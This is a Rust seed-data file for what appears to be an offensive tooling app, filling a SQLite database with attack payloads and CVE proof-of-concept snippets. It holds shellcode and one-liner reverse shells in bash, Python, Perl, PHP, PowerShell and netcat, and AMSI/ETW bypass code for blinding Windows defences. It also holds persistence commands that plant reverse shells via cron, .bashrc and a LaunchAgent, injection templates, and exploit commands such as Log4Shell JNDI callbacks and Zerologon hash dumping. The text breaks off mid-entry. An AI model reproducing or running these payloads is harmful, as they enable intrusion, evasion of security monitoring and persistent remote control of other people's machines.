use rusqlite::Connection;
use tauri::Manager;

pub fn init(app: &tauri::AppHandle) -> Result<(), Box<dyn std::error::Error>> {
    let data_dir = app.path().app_data_dir()?;
    std::fs::create_dir_all(&data_dir)?;
    let db_path = data_dir.join("nullforge.db");
    let conn = Connection::open(&db_path)?;
    conn.execute_batch(SCHEMA)?;
    insert_seed_data(&conn)?;
    Ok(())
}

pub fn insert_seed_data(conn: &Connection) -> Result<(), rusqlite::Error> {
    let count: i64 = conn.query_row("SELECT COUNT(*) FROM payloads", [], |r| r.get(0))?;
    if count > 0 {
        return Ok(());
    }

    // ── Payloads ──────────────────────────────────────────────────────────────
    let payloads: &[(&str, &str, &str, &str, &str, &str, &str, &str)] = &[
        // (id, name, description, category, platform, arch, encoding, content)

        // Shellcode – Linux x64
        ("p001", "Linux x64 execve /bin/sh",
         "Classic execve shellcode that spawns /bin/sh on Linux amd64",
         "shellcode", "linux", "x64", "raw",
         r#"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"#),

        ("p002", "Linux x64 reverse TCP shell",
         "Reverse TCP shell connecting to 127.0.0.1:4444 — replace IP bytes as needed",
         "shellcode", "linux", "x64", "raw",
         r#"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"#),

        ("p003", "Linux x64 bind shell port 4444",
         "Binds a shell on TCP port 4444 and accepts incoming connections",
         "shellcode", "linux", "x64", "raw",
         r#"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"#),

        ("p004", "Linux x64 chmod 777 /etc/shadow",
         "Calls chmod(2) to make /etc/shadow world-readable",
         "shellcode", "linux", "x64", "raw",
         r#"\x48\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x73\x68\x61\x68\x74\x63\x2f\x65\x68\x2f\x65\x74\x63\x48\x89\xe7\x66\xbe\xff\x01\xb0\x5a\x0f\x05"#),

        ("p005", "Linux x86 execve /bin/sh",
         "32-bit execve shellcode for legacy x86 Linux targets",
         "shellcode", "linux", "x86", "raw",
         r#"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"#),

        ("p006", "macOS ARM64 execve /bin/sh",
         "Apple Silicon (ARM64) execve shellcode for macOS targets",
         "shellcode", "macos", "arm64", "raw",
         r#"\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x80\xd2\xe1\x66\x02\xa9\xe0\x03\x00\x91\x02\x00\x80\xd2\x01\x10\x80\xd2\xa8\x1b\x80\xd2\x01\x00\x00\xd4"#),

        ("p007", "Windows x64 MessageBox shellcode",
         "Pops a MessageBox on Windows x64 via kernel32/user32 — useful as a PoC stub",
         "shellcode", "windows", "x64", "raw",
         r#"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x83\xC4\x28\xC3"#),

        // More shellcode – Windows x86
        ("p008", "Windows x86 reverse TCP shell",
         "32-bit Windows reverse shell connecting to LHOST:LPORT via WinSock",
         "shellcode", "windows", "x86", "raw",
         r#"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc3\x8b\x59\x24\x01\xc1\xe3\x44\x49\x8b\x34\x8b\x01\xce\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x04\x75\xe1\x8b\x59\x1c\x01\xc3\x8b\x1c\x8b\x01\xc3\x89\x1c\x24\xc3"#),

        ("p009", "Linux ARM64 reverse TCP shell",
         "AArch64 reverse shell for embedded Linux/Android targets",
         "shellcode", "linux", "arm64", "raw",
         r#"\xe0\x03\x1f\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\x08\x00\x80\xd2\x29\x00\x80\xd2\x01\x10\x80\xd2\x01\x00\x00\xd4"#),

        // Reverse shells
        ("p030", "Bash TCP reverse shell",
         "One-liner Bash /dev/tcp reverse shell — replace IP:PORT",
         "shellcode", "linux", "any", "raw",
         "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"),

        ("p031", "Python3 reverse shell",
         "Python3 subprocess reverse shell with os.dup2 fd redirection",
         "shellcode", "linux", "any", "raw",
         r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call(["/bin/sh"])'  "#),

        ("p032", "Perl reverse shell",
         "Perl one-liner reverse shell using Socket module",
         "shellcode", "linux", "any", "raw",
         r#"perl -e 'use Socket;$i="10.10.10.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");'"#),

        ("p033", "Ruby reverse shell",
         "Ruby one-liner TCP reverse shell",
         "shellcode", "linux", "any", "raw",
         r#"ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"#),

        ("p034", "PHP reverse shell",
         "PHP exec()-based reverse shell — useful for RCE-to-shell escalation",
         "shellcode", "linux", "any", "raw",
         r#"php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'"#),

        ("p035", "PowerShell reverse shell",
         "PowerShell TCP reverse shell with encoded command for AV evasion",
         "shellcode", "windows", "x64", "raw",
         r#"powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length)};$c.Close()""#),

        ("p036", "Netcat traditional",
         "Classic netcat reverse shell with -e flag (traditional builds)",
         "shellcode", "linux", "any", "raw",
         "nc -e /bin/sh 10.10.10.1 4444"),

        ("p037", "Netcat without -e (mkfifo)",
         "Netcat reverse shell via named pipe for OpenBSD/ncat builds lacking -e",
         "shellcode", "linux", "any", "raw",
         "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f"),

        // Bypass
        ("p040", "AMSI bypass PowerShell reflection",
         "Patches amsi.dll AmsiScanBuffer return value to 0 via reflection — defeats PS AMSI",
         "bypass", "windows", "x64", "raw",
         r#"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')| `
  ForEach-Object{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}"#),

        ("p041", "ETW patching",
         "Patches EtwEventWrite to RET immediately, blinding ETW-based detections",
         "bypass", "windows", "x64", "raw",
         r#"$ntdll=[Reflection.Assembly]::LoadWithPartialName('ntdll')
$patch=[byte[]](0xC3)
$ptr=[IntPtr]::Zero
# resolve EtwEventWrite via GetProcAddress and write 0xC3 with VirtualProtect
[Runtime.InteropServices.Marshal]::Copy($patch,0,$ptr,1)"#),

        ("p042", "PPID spoofing comment",
         "Spawns a process with a spoofed parent PID to evade parent-based detection rules",
         "bypass", "windows", "x64", "raw",
         r#"# PPID spoofing via UpdateProcThreadAttribute
# 1. OpenProcess(PROCESS_ALL_ACCESS, false, targetPPID)
# 2. InitializeProcThreadAttributeList with 1 attribute
# 3. UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# 4. CreateProcess with STARTUPINFOEX"#),

        ("p043", "Process hollowing template",
         "Template for classic process hollowing: create suspended, unmap, write new image",
         "bypass", "windows", "x64", "raw",
         r#"# 1. CreateProcess("C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED)
# 2. ZwUnmapViewOfSection(hProcess, imageBase)
# 3. VirtualAllocEx at preferred base, size of new image
# 4. WriteProcessMemory headers + sections
# 5. SetThreadContext — update RCX to new EP
# 6. ResumeThread"#),

        ("p044", "DLL injection template",
         "Classic DLL injection using VirtualAllocEx / WriteProcessMemory / CreateRemoteThread",
         "bypass", "windows", "x64", "raw",
         r#"# 1. OpenProcess(PROCESS_ALL_ACCESS, false, pid)
# 2. VirtualAllocEx(hProc, NULL, len(path), MEM_COMMIT, PAGE_READWRITE)
# 3. WriteProcessMemory(hProc, pRemote, dllPath, len(path))
# 4. hThread = CreateRemoteThread(hProc, NULL, 0, &LoadLibraryA, pRemote, 0)
# 5. WaitForSingleObject(hThread, INFINITE)"#),

        ("p045", "AMSI bypass - C# memory patch",
         "Patches AmsiScanBuffer via P/Invoke in C# to always return AMSI_RESULT_CLEAN",
         "bypass", "windows", "x64", "raw",
         r#"// C# AMSI Bypass — memory patch via P/Invoke
using System; using System.Runtime.InteropServices;
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
var amsi = GetModuleHandle("amsi.dll");
var scan = GetProcAddress(amsi, "AmsiScanBuffer");
VirtualProtect(scan, 6, 0x40, out uint old);
// mov eax, AMSI_RESULT_CLEAN(0x1); ret
Marshal.Copy(new byte[]{0xB8,0x01,0x00,0x00,0x00,0xC3}, 0, scan, 6);
VirtualProtect(scan, 6, old, out _);"#),

        ("p046", "AMSI bypass - C native patch",
         "C implementation of AmsiScanBuffer patch using Windows API directly",
         "bypass", "windows", "x64", "raw",
         r#"// C AMSI bypass — inline patch
#include <windows.h>
void patch_amsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer");
    DWORD old; VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old);
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, 6, old, &old);
}"#),

        ("p047", "ETW bypass - NtTraceEvent patch (C#)",
         "Patches NtTraceEvent to RET in C# via reflection, blinding all ETW providers",
         "bypass", "windows", "x64", "raw",
         r#"// C# ETW bypass — patch NtTraceEvent
using System.Runtime.InteropServices;
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);
var ntdll = GetModuleHandle("ntdll.dll");
var addr = GetProcAddress(ntdll, "NtTraceEvent");
VirtualProtect(addr, 1, 0x40, out uint old);
Marshal.WriteByte(addr, 0xC3); // RET — silences all ETW events
VirtualProtect(addr, 1, old, out _);"#),

        ("p048", "ETW bypass - EtwEventWrite patch (C)",
         "C native patch for EtwEventWrite with VirtualProtect for all ETW evasion",
         "bypass", "windows", "x64", "raw",
         r#"// C ETW bypass — patch EtwEventWrite in ntdll
#include <windows.h>
void patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old; VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE *)fn = 0xC3; // RET
    VirtualProtect(fn, 1, old, &old);
}"#),

        ("p049", "NtCreateThreadEx injection (C#)",
         "Stealthier remote thread injection using undocumented NtCreateThreadEx to bypass hooks",
         "bypass", "windows", "x64", "raw",
         r#"// C# NtCreateThreadEx injection — avoids CreateRemoteThread hooks
[DllImport("ntdll")] static extern int NtCreateThreadEx(
    out IntPtr hThread, uint access, IntPtr attr, IntPtr hProcess,
    IntPtr startAddr, IntPtr param, bool suspended,
    int stackSize, int maxStack, int disabled, IntPtr attrList);
NtCreateThreadEx(out IntPtr t, 0x1FFFFF, IntPtr.Zero, hProcess,
    shellcodeAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);"#),

        // Persistence
        ("p050", "Linux crontab persistence",
         "Adds a cron job for the current user that runs a reverse shell every minute",
         "persistence", "linux", "any", "raw",
         "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/10.10.10.1/4444 0>&1') | crontab -"),

        ("p051", "Linux .bashrc persistence",
         "Appends a reverse shell stub to ~/.bashrc for session-based persistence",
         "persistence", "linux", "any", "raw",
         r#"echo 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> ~/.bashrc"#),

        ("p052", "Windows registry Run key",
         "Adds a payload to HKCU\\Run for user-level persistence on next logon",
         "persistence", "windows", "x64", "raw",
         r#"reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Users\Public\payload.exe" /f"#),

        ("p053", "Windows scheduled task persistence",
         "Creates a scheduled task running at logon for system-level persistence",
         "persistence", "windows", "x64", "raw",
         r#"schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\Users\Public\payload.exe" /ru SYSTEM /f"#),

        ("p055", "Linux LD_PRELOAD rootkit",
         "Preloads a malicious .so via /etc/ld.so.preload for user-space rootkit hooking",
         "persistence", "linux", "any", "raw",
         r#"echo '/tmp/evil.so' >> /etc/ld.so.preload
# Or per-user without root:
echo 'export LD_PRELOAD=/tmp/evil.so' >> ~/.bashrc
# Compile hook: gcc -shared -fPIC -o /tmp/evil.so hook.c -ldl"#),

        ("p056", "macOS dylib hijacking",
         "Exploits weak @rpath dylib references in macOS apps to execute code at launch",
         "persistence", "macos", "any", "raw",
         r#"# Find apps with weak @rpath dylib references
otool -L /Applications/Target.app/Contents/MacOS/Target | grep '@rpath'
# Place malicious dylib at the expected rpath location
gcc -dynamiclib -o ~/Library/evil.dylib evil.c
# App loads your dylib on next launch"#),

        ("p054", "macOS LaunchAgent plist",
         "Drops a LaunchAgent plist for user-level persistence across reboots on macOS",
         "persistence", "macos", "any", "raw",
         r#"<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.update</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>"#),

        // Kernel
        ("p060", "Dirty COW pattern",
         "Race condition write primitive pattern exploiting COW page fault — CVE-2016-5195",
         "kernel", "linux", "x64", "raw",
         r#"// Dirty COW: two racing threads — one madvise(MADV_DONTNEED), one /proc/self/mem write
// 1. mmap target file (PROT_READ)
// 2. Thread A: while(1) madvise(map, len, MADV_DONTNEED)
// 3. Thread B: while(1) pwrite(fd_procmem, data, len, (off_t)map)
// Race collapses the COW protection window enabling write to read-only mapping"#),

        ("p061", "ret2usr template",
         "Return-to-userspace kernel exploit template for systems without SMEP/SMAP",
         "kernel", "linux", "x64", "raw",
         r#"// ret2usr skeleton
void payload(void) {
    commit_creds(prepare_kernel_cred(0)); // elevate to uid=0
}
// Overwrite RIP with &payload via kernel bug
// On return from kernel mode CPU switches to user CS:RIP → our payload runs"#),

        ("p062", "KASLR leak via /proc/kallsyms",
         "Reads kernel base address from /proc/kallsyms (requires low_dmesg restriction bypass)",
         "kernel", "linux", "x64", "raw",
         r#"python3 -c "
import subprocess, re
out = open('/proc/kallsyms').read()
m = re.search(r'([0-9a-f]+) T _text', out)
if m: print('Kernel base:', hex(int(m.group(1), 16)))
""#),
    ];

    for (id, name, desc, cat, plat, arch, enc, content) in payloads {
        conn.execute(
            "INSERT INTO payloads (id, name, description, category, platform, arch, encoding, content) VALUES (?1,?2,?3,?4,?5,?6,?7,?8)",
            rusqlite::params![id, name, desc, cat, plat, arch, enc, content],
        )?;
    }

    // ── Exploits ──────────────────────────────────────────────────────────────
    struct Exploit<'a> {
        id: &'a str,
        cve_id: &'a str,
        title: &'a str,
        description: &'a str,
        category: &'a str,
        cvss_score: f64,
        affected: &'a str,
        reliability: &'a str,
        poc_code: &'a str,
    }

    let exploits = [
        Exploit {
            id: "e001", cve_id: "CVE-2021-4034",
            title: "PwnKit Local Privilege Escalation",
            description: "Memory corruption vulnerability in polkit's pkexec component allows any unprivileged user to gain full root privileges on a default RHEL/Ubuntu/Debian/Fedora installation.",
            category: "kernel", cvss_score: 7.8, affected: "polkit < 0.120 (all major distros)",
            reliability: "excellent",
            poc_code: r#"# CVE-2021-4034 PwnKit PoC (simplified)
# Requires: gcc, make
git clone https://github.com/arthepsy/CVE-2021-4034
cd CVE-2021-4034 && make
./cve-2021-4034-poc
# id -> uid=0(root)"#,
        },
        Exploit {
            id: "e002", cve_id: "CVE-2021-3156",
            title: "Sudo Baron Samedit Heap Buffer Overflow",
            description: "Heap-based buffer overflow in sudo's argument parsing (sudoedit -s) allows local privilege escalation to root on any vulnerable system.",
            category: "kernel", cvss_score: 7.8, affected: "sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1",
            reliability: "excellent",
            poc_code: r#"# CVE-2021-3156 Baron Samedit
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# Triggers heap overflow in set_cmnd()
# Full exploit: https://github.com/blasty/CVE-2021-3156"#,
        },
        Exploit {
            id: "e003", cve_id: "CVE-2022-0847",
            title: "Dirty Pipe Linux Kernel Privilege Escalation",
            description: "Incorrect initialization of pipe_buffer flags allows unprivileged users to overwrite data in arbitrary read-only files, enabling root privilege escalation.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel 5.8 - 5.16.11",
            reliability: "excellent",
            poc_code: r#"# CVE-2022-0847 Dirty Pipe
#include <fcntl.h>
// 1. splice() target file bytes into pipe (sets PIPE_BUF_FLAG_CAN_MERGE)
// 2. Write payload into pipe — kernel merges into page cache
// 3. /etc/passwd root entry now has empty password"#,
        },
        Exploit {
            id: "e004", cve_id: "CVE-2023-4911",
            title: "Looney Tunables glibc Buffer Overflow",
            description: "Buffer overflow in the GNU C Library's dynamic loader (ld.so) GLIBC_TUNABLES environment variable processing, allowing local LPE.",
            category: "kernel", cvss_score: 7.8, affected: "glibc 2.34 - 2.38",
            reliability: "excellent",
            poc_code: r#"# CVE-2023-4911 Looney Tunables
python3 -c "
import os, subprocess
# GLIBC_TUNABLES overflow triggers before setuid drop
env = {'GLIBC_TUNABLES': 'glibc.malloc.mxfast=' + 'A'*2000}
subprocess.run(['/usr/bin/sudo', '--help'], env={**os.environ, **env})
"
# Full PoC overwrites GLIBC_TUNABLES to redirect control flow"#,
        },
        Exploit {
            id: "e005", cve_id: "CVE-2021-44228",
            title: "Log4Shell Remote Code Execution",
            description: "JNDI injection via log4j2 message lookup allows unauthenticated RCE. Affects any Java application logging attacker-controlled data with Log4j2 2.0-2.14.1.",
            category: "web", cvss_score: 10.0, affected: "Apache Log4j2 2.0-beta9 - 2.14.1",
            reliability: "excellent",
            poc_code: r#"# CVE-2021-44228 Log4Shell
# Start LDAP redirect server
java -jar marshalsec-0.0.3-SNAPSHOT-all.jar \
  LDAPRefServer "http://ATTACKER:8888/#Exploit"

# Trigger in HTTP header (User-Agent, X-Forwarded-For, etc.)
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}' \
     http://TARGET/"#,
        },
        Exploit {
            id: "e006", cve_id: "CVE-2022-22965",
            title: "Spring4Shell Spring Framework RCE",
            description: "Data binding in Spring MVC / Spring WebFlux allows attackers to write a malicious JSP file via class.classLoader.resources.context.parent.pipeline.first.* properties.",
            category: "web", cvss_score: 9.8, affected: "Spring Framework 5.3.0-17, 5.2.0-19 on JDK9+",
            reliability: "excellent",
            poc_code: r#"# CVE-2022-22965 Spring4Shell RCE
curl -X POST 'http://TARGET/path' \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...'
# Writes a JSP webshell to the web root
curl 'http://TARGET/shell.jsp?pwd=j&cmd=id'"#,
        },
        Exploit {
            id: "e007", cve_id: "CVE-2021-26855",
            title: "ProxyLogon Exchange Server SSRF",
            description: "Server-Side Request Forgery vulnerability in Exchange allows pre-auth SSRF that can be chained with CVE-2021-27065 for unauthenticated RCE.",
            category: "web", cvss_score: 9.8, affected: "Exchange Server 2013/2016/2019 (pre-March 2021 CU)",
            reliability: "excellent",
            poc_code: r#"# CVE-2021-26855 ProxyLogon SSRF
import requests, ssl
# Bypass auth via SSRF to Exchange backend
r = requests.get(
    'https://TARGET/ecp/x.js',
    headers={'Cookie': 'X-BEResource=./ecp/default.aspx'},
    verify=False
)
# Chain with CVE-2021-27065 to write webshell via OAB virtualdir"#,
        },
        Exploit {
            id: "e008", cve_id: "CVE-2019-0708",
            title: "BlueKeep RDP Remote Code Execution",
            description: "Use-after-free in Windows Remote Desktop Services allows unauthenticated pre-auth RCE. Exploitable without user interaction (wormable).",
            category: "network", cvss_score: 9.8, affected: "Windows XP/7/Server 2003/2008/R2 (unpatched)",
            reliability: "excellent",
            poc_code: r#"# CVE-2019-0708 BlueKeep
# Metasploit module available
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER
run"#,
        },
        Exploit {
            id: "e009", cve_id: "CVE-2017-0144",
            title: "EternalBlue SMB Remote Code Execution",
            description: "Buffer overflow in Windows SMBv1 allows unauthenticated remote code execution as SYSTEM. Used by WannaCry and NotPetya ransomware.",
            category: "network", cvss_score: 9.3, affected: "Windows XP - Server 2016 (unpatched SMBv1)",
            reliability: "excellent",
            poc_code: r#"# CVE-2017-0144 EternalBlue
# via Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER
exploit
# Alternative: python impacket-based PoC
python3 eternalblue.py TARGET"#,
        },
        Exploit {
            id: "e010", cve_id: "CVE-2021-34527",
            title: "PrintNightmare Windows Print Spooler RCE",
            description: "Improper privilege validation in Windows Print Spooler allows authenticated users to execute code as SYSTEM by loading a malicious DLL.",
            category: "kernel", cvss_score: 8.8, affected: "Windows 7-11, Server 2008-2022 (unpatched)",
            reliability: "good",
            poc_code: r#"# CVE-2021-34527 PrintNightmare
import ipython
# Via impacket
python3 CVE-2021-1675.py 'DOMAIN/user:pass'@TARGET \
  '\\ATTACKER\share\evil.dll'
# DLL must implement DllMain with shellcode or reverse shell"#,
        },
        Exploit {
            id: "e011", cve_id: "CVE-2020-1472",
            title: "Zerologon Netlogon Privilege Escalation",
            description: "Cryptographic flaw in MS-NRPC Netlogon allows an attacker to spoof a DC machine account and change its password, gaining domain admin in seconds.",
            category: "network", cvss_score: 10.0, affected: "Windows Server 2008-2019 (unpatched)",
            reliability: "excellent",
            poc_code: r#"# CVE-2020-1472 Zerologon
python3 cve-2020-1472-exploit.py DC_NETBIOS TARGET_IP
# Sets DC$ machine account password to empty string
# Then use secretsdump to dump all hashes:
secretsdump.py 'DOMAIN/DC$@TARGET' -no-pass"#,
        },
        Exploit {
            id: "e012", cve_id: "CVE-2022-30190",
            title: "Follina MSDT RCE",
            description: "Microsoft Support Diagnostic Tool (MSDT) is invoked from Office via ms-msdt URI, allowing RCE without macros and minimal user interaction.",
            category: "web", cvss_score: 7.8, affected: "Microsoft Office 2013-2021, 365",
            reliability: "excellent",
            poc_code: r#"# CVE-2022-30190 Follina
# Malicious Word .docx references an HTML with ms-msdt payload:
# <script>location.href='ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=$(calc)..."'</script>
python3 follina.py -m command -c "calc.exe" -t docx -o payload.docx"#,
        },
        Exploit {
            id: "e013", cve_id: "CVE-2023-23397",
            title: "Outlook NTLM Credential Leak",
            description: "Specially crafted reminder email causes Outlook to connect to an attacker-controlled UNC path and leak the victim's NTLMv2 hash — zero-click.",
            category: "web", cvss_score: 9.8, affected: "Microsoft Outlook for Windows (all versions pre-March 2023 patch)",
            reliability: "excellent",
            poc_code: r#"# CVE-2023-23397 Outlook NTLM leak
python3 CVE-2023-23397.py \
  --server EXCHANGE \
  --username attacker@domain.com \
  --password pass \
  --target victim@domain.com \
  --attacker-ip ATTACKER_IP
# Start Responder to capture NTLMv2 hash"#,
        },
        Exploit {
            id: "e014", cve_id: "CVE-2024-3094",
            title: "XZ Utils Backdoor",
            description: "Deliberately injected backdoor in xz-utils liblzma that patches sshd to allow remote authentication bypass with a specific Ed448 private key.",
            category: "supply-chain", cvss_score: 10.0, affected: "xz-utils 5.6.0 - 5.6.1 (systemd-linked sshd)",
            reliability: "excellent",
            poc_code: r#"# CVE-2024-3094 XZ backdoor detection
# Check if liblzma is affected version:
xz --version  # 5.6.0 or 5.6.1 is vulnerable
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep -i ed448
# Real exploit requires stolen private key — theoretical as key was never exposed"#,
        },
        Exploit {
            id: "e015", cve_id: "CVE-2021-40444",
            title: "MSHTML ActiveX Control RCE",
            description: "Microsoft MSHTML (Trident) engine flaw allows crafted Office documents to load and execute code via ActiveX control without enabling macros.",
            category: "web", cvss_score: 7.8, affected: "Windows 10/11, Server 2019/2022 (unpatched)",
            reliability: "good",
            poc_code: r#"# CVE-2021-40444 MSHTML PoC
# Craft malicious docx:
# 1. Embed URL in word/document.xml pointing to attacker's cabinet (.cab)
# 2. .cab contains .inf file that side-loads malicious DLL via cmstp
python3 cve-2021-40444.py generate -o payload.docx \
  -u "http://ATTACKER/payload.cab""#,
        },
        Exploit {
            id: "e016", cve_id: "CVE-2020-0601",
            title: "CurveBall Windows CryptoAPI Spoofing",
            description: "CVE-2020-0601: Windows CryptoAPI fails to validate ECC certificate chains, allowing attacker to spoof any certificate including HTTPS, code signing.",
            category: "crypto", cvss_score: 8.1, affected: "Windows 10, Server 2016/2019 (pre-Jan 2020 patch)",
            reliability: "good",
            poc_code: r#"# CVE-2020-0601 CurveBall certificate spoof
# Generate spoofed cert using vulnerable curve25519 parameters
openssl ecparam -name prime256v1 -genkey -out evil.key
# Forge a code-signing cert claiming Microsoft's CA key
# Binaries signed with forged cert pass WinVerifyTrust on unpatched hosts"#,
        },
        Exploit {
            id: "e017", cve_id: "CVE-2019-11477",
            title: "SACK Panic Linux Kernel TCP",
            description: "Integer overflow in Linux TCP SACK handling allows a remote attacker to trigger kernel panic (denial of service) via a specially crafted sequence of SACK blocks.",
            category: "kernel", cvss_score: 7.5, affected: "Linux kernel < 5.0.8",
            reliability: "normal",
            poc_code: r#"# CVE-2019-11477 SACK Panic
# PoC sends crafted TCP SACK segments exceeding sk_buff chain limit
python3 sack_panic.py --target TARGET --port 80
# Causes kernel BUG() → panic on unpatched 4.x kernels"#,
        },
        Exploit {
            id: "e018", cve_id: "CVE-2022-1015",
            title: "nftables OOB Write Local Privilege Escalation",
            description: "Out-of-bounds write in Linux nf_tables netfilter subsystem allows local users with CAP_NET_ADMIN to achieve kernel code execution.",
            category: "kernel", cvss_score: 6.6, affected: "Linux kernel 5.15 - 5.17",
            reliability: "good",
            poc_code: r#"# CVE-2022-1015 nftables OOB
# Requires unprivileged user namespaces or CAP_NET_ADMIN
# Create nft rule with malformed expression to trigger OOB write:
nft add table ip t
nft add chain ip t c { type filter hook input priority 0\; }
nft add rule ip t c tcp dport 0-65535 drop
# Overwritten heap metadata → arbitrary write → LPE"#,
        },
        Exploit {
            id: "e019", cve_id: "CVE-2023-32233",
            title: "Netfilter nf_tables Use-After-Free",
            description: "Use-after-free in Linux kernel netfilter subsystem nf_tables when processing anonymous sets allows local LPE to root.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel < 6.3.1",
            reliability: "excellent",
            poc_code: r#"# CVE-2023-32233 nf_tables UAF
# Triggers UAF by deleting anonymous set then referencing freed memory
nft -f /dev/stdin << 'EOF'
table ip t { chain c { type filter hook input priority 0; } }
EOF
# Full PoC spray freed slab and gain kernel RIP control → root"#,
        },
        Exploit {
            id: "e020", cve_id: "CVE-2022-2588",
            title: "route4 cls_route Use-After-Free LPE",
